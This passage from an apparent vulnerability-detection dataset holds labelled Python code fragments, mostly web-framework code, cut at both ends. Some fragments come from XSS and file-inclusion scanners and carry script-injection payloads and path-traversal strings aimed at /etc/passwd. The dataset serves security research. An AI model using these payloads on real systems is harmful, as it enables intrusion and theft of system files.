we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at", "label": 0}, {"snippet_id": 5458, "code": "'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', ", "label": 0}, {"snippet_id": 35848, "code": " \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission", "label": 0}, {"snippet_id": 54967, "code": "\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity', 'locale') .distinct() ) for changed_entity in changed_entities: key=(changed_entity.pk, locale.pk) if key not in", "label": 0}, {"snippet_id": 6818, "code": ": \"\"\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property", "label": 0}, {"snippet_id": 53027, "code": ".dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response", "label": 0}, {"snippet_id": 51773, "code": "\"/dashboard/\" LOGOUT_REDIRECT_URL=LOGIN_URL TWO_FACTOR_QR_FACTORY='qrcode.image.pil.PilImage' TWO_FACTOR_TOTP_DIGITS=6 TWO_FACTOR_PATCH_ADMIN=True FIELD_ENCRYPTION_KEY=os.environ.get('FIELD_ENCRYPTION_KEY", "label": 0}, {"snippet_id": 54622, "code": " queryset: i.md=markdown(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin):", "label": 1}, {"snippet_id": 33301, "code": " MainHandler), webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler), webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler), ] routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend", "label": 0}, {"snippet_id": 54461, "code": " from django.contrib.auth.forms import UserCreationForm, PasswordChangeForm from django.contrib.auth.models import User from django.contrib.auth.decorators import login_required from django.contrib.auth", "label": 0}, {"snippet_id": 53104, "code": "']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data", "label": 0}, {"snippet_id": 51981, "code": " django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable", "label": 0}, {"snippet_id": 36076, "code": " get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"", "label": 0}, {"snippet_id": 2887, "code": " result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\":", "label": 0}, {"snippet_id": 4898, "code": ":alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>'", "label": 0}, {"snippet_id": 38262, "code": ".blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif", "label": 0}, {"snippet_id": 3025, "code": ",method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid)", "label": 0}, {"snippet_id": 32956, "code": "._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()) f.close() def _Read(self, relpath, relative_to=None", "label": 0}, {"snippet_id": 26395, "code": " an incorrect result. We will therefore ' 'need to charge VAT on your invoice. Please contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm", "label": 0}, {"snippet_id": 34408, "code": " key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t", "label": 0}, {"snippet_id": 35657, "code": ".meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 19791, "code": "-assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore", "label": 0}, {"snippet_id": 23336, "code": "*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings", "label": 0}, {"snippet_id": 35433, "code": "'fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 29586, "code": "(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode", "label": 0}, {"snippet_id": 11890, "code": " is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url", "label": 0}, {"snippet_id": 9650, "code": "\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware", "label": 0}, {"snippet_id": 51572, "code": ".contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION='dashboard.wsgi.application' DATABASE_OPTIONS={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection", "label": 0}, {"snippet_id": 6449, "code": " userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property def userdb_mongo_database", "label": 0}, {"snippet_id": 5952, "code": " event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s", "label": 0}, {"snippet_id": 17994, "code": "]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$", "label": 0}, {"snippet_id": 26534, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '", "label": 0}, {"snippet_id": 24119, "code": " \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command", "label": 0}, {"snippet_id": 48869, "code": ".query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return ", "label": 0}, {"snippet_id": 33113, "code": " as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import", "label": 0}, {"snippet_id": 14384, "code": "): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 32786, "code": "' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate", "label": 0}, {"snippet_id": 35794, "code": "\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'", "label": 0}, {"snippet_id": 54022, "code": " tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date", "label": 0}, {"snippet_id": 6054, "code": " None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri':", "label": 0}, {"snippet_id": 41359, "code": ", filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters", "label": 0}, {"snippet_id": 35393, "code": " link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t", "label": 0}, {"snippet_id": 27118, "code": " len(page) > 0 and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value", "label": 1}, {"snippet_id": 33148, "code": ".RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self): return self.redirect(README_MD) class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob", "label": 0}, {"snippet_id": 25549, "code": " tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos", "label": 0}, {"snippet_id": 12955, "code": "')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=", "label": 0}, {"snippet_id": 18560, "code": "', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action", "label": 0}, {"snippet_id": 25127, "code": "'--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains", "label": 0}, {"snippet_id": 7453, "code": ", 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 29655, "code": "\") \t\tpass def escape_html(text): \treturn cgi.escape(text, quote=True) \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True", "label": 0}, {"snippet_id": 37206, "code": " from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown", "label": 1}, {"snippet_id": 20145, "code": ".cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses", "label": 0}, {"snippet_id": 54352, "code": "(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid", "label": 0}, {"snippet_id": 11277, "code": ".course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self", "label": 0}, {"snippet_id": 28898, "code": " the server' \t\t\tpass \t\telse: \t\t\terror=e\t \t\t\tpass \t\treturn str(error) def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql", "label": 0}, {"snippet_id": 17740, "code": "'password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name=", "label": 0}, {"snippet_id": 18854, "code": " urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 30195, "code": "'action_waf') \tcommands=[ \"sudo systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page'))", "label": 0}, {"snippet_id": 21619, "code": ".list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(", "label": 0}, {"snippet_id": 22107, "code": " ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 6236, "code": "): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res: res=None return res @property def syslog_socket(self)", "label": 0}, {"snippet_id": 5807, "code": " ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self", "label": 0}, {"snippet_id": 8112, "code": "+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 12225, "code": ".pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 43531, "code": ".doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float", "label": 0}, {"snippet_id": 22963, "code": "+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware", "label": 0}, {"snippet_id": 21818, "code": " urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)", "label": 0}, {"snippet_id": 25144, "code": " Decimal import dateutil.parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from", "label": 0}, {"snippet_id": 5116, "code": "=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t", "label": 0}, {"snippet_id": 53156, "code": " response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id):", "label": 0}, {"snippet_id": 20979, "code": "'press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings", "label": 0}, {"snippet_id": 18613, "code": "-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=", "label": 0}, {"snippet_id": 52975, "code": ".name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise", "label": 0}, {"snippet_id": 39378, "code": ".db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise", "label": 0}, {"snippet_id": 18768, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE", "label": 0}, {"snippet_id": 35546, "code": ".append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields", "label": 0}, {"snippet_id": 28251, "code": ": \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg", "label": 0}, {"snippet_id": 9789, "code": "'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid", "label": 0}, {"snippet_id": 25291, "code": " '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict(", "label": 0}, {"snippet_id": 809, "code": "'': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method", "label": 1}, {"snippet_id": 29487, "code": "(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" ", "label": 0}, {"snippet_id": 54755, "code": " ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def get_context_data(self, ", "label": 0}, {"snippet_id": 44297, "code": "'oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow", "label": 0}, {"snippet_id": 20233, "code": ".py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue", "label": 0}, {"snippet_id": 46225, "code": " json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable", "label": 0}, {"snippet_id": 29980, "code": ") \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path", "label": 0}, {"snippet_id": 3522, "code": ": %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url", "label": 0}, {"snippet_id": 9011, "code": "'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/", "label": 0}, {"snippet_id": 24833, "code": " noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the", "label": 0}, {"snippet_id": 16782, "code": ".pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 16368, "code": ".views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=", "label": 0}, {"snippet_id": 54770, "code": " success_url='/' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form):", "label": 0}, {"snippet_id": 43105, "code": ".in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value", "label": 0}, {"snippet_id": 29422, "code": "\t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands", "label": 0}, {"snippet_id": 36058, "code": " fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name,", "label": 0}, {"snippet_id": 5804, "code": "&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads", "label": 0}, {"snippet_id": 38996, "code": "\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t", "label": 0}, {"snippet_id": 7521, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 34477, "code": " BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse", "label": 0}, {"snippet_id": 2444, "code": " in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers", "label": 0}, {"snippet_id": 30828, "code": "\t\t\t\t\t\t \tprint(template) \t if serv is not None and form.getvalue('right') is not None: \tfrom jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir", "label": 0}, {"snippet_id": 30646, "code": "=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act", "label": 0}, {"snippet_id": 27093, "code": " return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line", "label": 1}, {"snippet_id": 48373, "code": "?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects.get(id=int(request.GET[\"group_id\"])) for art in Article.objects.all().filter(group=g): if str(\"quantity_\" +str(art.id)) not in request.POST", "label": 0}, {"snippet_id": 28617, "code": "=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit", "label": 0}, {"snippet_id": 23909, "code": " verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self", "label": 1}, {"snippet_id": 43889, "code": " to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self", "label": 0}, {"snippet_id": 27260, "code": " exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information", "label": 1}, {"snippet_id": 42379, "code": " self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if", "label": 0}, {"snippet_id": 12060, "code": "=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course", "label": 0}, {"snippet_id": 29039, "code": "\tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+", "label": 0}, {"snippet_id": 46544, "code": " is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False), 'existing_hue_collections': existing_hue_collections, 'is_redirect", "label": 0}, {"snippet_id": 50762, "code": ": Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string=True) options=kwargs.pop(\"options", "label": 0}, {"snippet_id": 7079, "code": ".begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name=", "label": 0}, {"snippet_id": 24320, "code": " coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers", "label": 0}, {"snippet_id": 15173, "code": " ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is", "label": 0}, {"snippet_id": 40520, "code": ".fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname,", "label": 0}, {"snippet_id": 35523, "code": " \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus", "label": 0}, {"snippet_id": 39410, "code": " self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset", "label": 0}, {"snippet_id": 42620, "code": "' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in 